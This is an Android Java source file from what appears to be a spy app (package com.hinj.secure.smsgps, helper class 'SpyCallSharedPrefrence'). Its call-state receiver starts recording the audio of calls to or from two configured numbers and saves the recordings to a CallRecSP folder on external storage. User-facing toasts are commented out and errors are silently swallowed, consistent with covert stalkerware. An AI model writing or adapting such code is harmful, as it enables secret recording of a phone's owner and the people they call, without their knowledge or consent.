/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 *
 * 
 */
package com.hinj.secure.smsgps;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.internal.telephony.ITelephony;
import com.hinj.app.utils.SpyCallSharedPrefrence;

/**
 * @author jitendrav
 * 
 *
 */
public class CallRecordBroadcast extends BroadcastReceiver{
	String filepath="",strCallRecordStatus;	
    ITelephony telephonyService;
    String CurrentDate="";
    Context ctx;
	/* (non-Javadoc)
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context, android.content.Intent)
	 */
	@SuppressLint("InlinedApi")
	
	static MediaRecorder Callrecorder;
	@Override
	public void onReceive(Context context, Intent intent) {
		
		this.ctx=context;
		//Call Status Check******************** 			
		strCallRecordStatus=SpyCallSharedPrefrence.getCallRecordStatus(ctx);
		Log.i("CallRecordStatus    ", strCallRecordStatus);
		
		if(strCallRecordStatus.equals("1")){
		File file=null;
		/*****Create Folder for store Call Record files****/
		File folder=new File(Environment.getExternalStorageDirectory()+"/CallRecSP");
		if(!folder.exists())
		{
			folder.mkdirs();
		}
		
		// TODO Auto-generated method stub
		try{
			Calendar c = Calendar.getInstance();
			//System.out.println("Current time => " + c.getTime());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			CurrentDate = df.format(c.getTime());	
			String phonenumber="";
			phonenumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
			
			Log.i("PHONE NUMBER ! is out if:    ", phonenumber);
			Log.i("number1 ! is out if:    ", getCallRecordNumber("number1"));
			Log.i("number2 ! is out if:    ", getCallRecordNumber("number2"));
			if(intent.getAction().equals("android.intent.action.PHONE_STATE")){
			
				/*String number11 = getCallRecordNumber("number1");
				String number22= phonenumber;
				int lenght1= number11.length();//12
				int lenght2=number22.length();//10
*/				/*if(number11.contains(number22))
				{
					String nume= phNum.substring(ph2.length()-10, phNum.length());
					
				}*/
					
				
			//if(getCallRecordNumber("number1").equals(phonenumber) && getCallRecordNumber("number2").equals(phonenumber)){
				if(phonenumber.contains(getCallRecordNumber("number1")) || phonenumber.contains(getCallRecordNumber("number2"))){
				//************		
				/*String phonenumber="";
				phonenumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);*/
				/****
				 * Mobile Number get in service class "Call_Record_Service"  
				 * and set below
				 * */
				
				Log.i("PHONE NUMBER ! is in if  :    ", phonenumber);
				
				SpyCallSharedPrefrence.saveCallRecordMobileNumber(context, phonenumber);
				String state = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
				
				filepath = Environment.getExternalStorageDirectory()+ "/CallRecSP/IncomingCall_"+CurrentDate+".3ga";
				//filepath = Environment.getExternalStorageDirectory()+ "/.CallRecSP/IncomingCall_"+".3ga";
				
				if(state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING)){
					
					if(Callrecorder== null){
						Callrecorder = new MediaRecorder();
						// Toast.makeText(context, "Call Recieved", Toast.LENGTH_LONG).show();
				            // Your Code
						    Callrecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
						    Callrecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
						    Callrecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
						    Callrecorder.setOutputFile(filepath);						    
						    try {
								Callrecorder.prepare();
							} catch (IllegalStateException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							} catch (IOException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
					}
				
					Callrecorder.start();
					
				}
				else  if (state.equals(TelephonyManager.EXTRA_STATE_IDLE))
	            {
	                  //Toast.makeText(context, "Phone Is Idle", Toast.LENGTH_LONG).show();
	                      // Your Code
	                  if(Callrecorder!=null)
	                  {
	                	  Callrecorder.stop();
	                	  Callrecorder.reset();
			              Callrecorder.release();
			              Callrecorder=null;
	                  }	                  
	           }
			}
			
		}else if(intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)){
			if(getCallRecordNumber("number1").equals(phonenumber) && getCallRecordNumber("number2").equals(phonenumber) ){
				
				//************	
				/*String phonenumber="";
				phonenumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);*/
				//************
				if(Callrecorder== null){
					/****
					 * Mobile Number get in service class "Call_Record_Service"  
					 * and set below
					 * */
					SpyCallSharedPrefrence.saveCallRecordMobileNumber(context, phonenumber);
					Callrecorder = new MediaRecorder();					
					filepath = Environment.getExternalStorageDirectory()+ "/CallRecSP/OutCall_"+CurrentDate+".3ga";
					//filepath = Environment.getExternalStorageDirectory()+ "/.CallRecSP/OutCall_"+".3ga";
					
					// Toast.makeText(context, "Outgoing Call", Toast.LENGTH_LONG).show();
					 
			            // Your Code
					    Callrecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
					    Callrecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
					    Callrecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
					    Callrecorder.setOutputFile(filepath);
					    
					    try {
							Callrecorder.prepare();

						} catch (IllegalStateException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
				}
				Callrecorder.start();
			}}
		
		}catch(Exception e){
			//e.printStackTrace();
		}
		}
		else{
			Log.i("Status OFF    ", "0");
		}
	}
	private String getCallRecordNumber(String number)
	{
		try {
			JSONObject jsonObj = new JSONObject(SpyCallSharedPrefrence.getLoggingStatus(ctx));
			JSONObject obj = jsonObj.getJSONObject("UserCallRecordNumber");
			return obj.get(number).toString();
		} catch (NumberFormatException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return "";
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return "";
		}

	}
}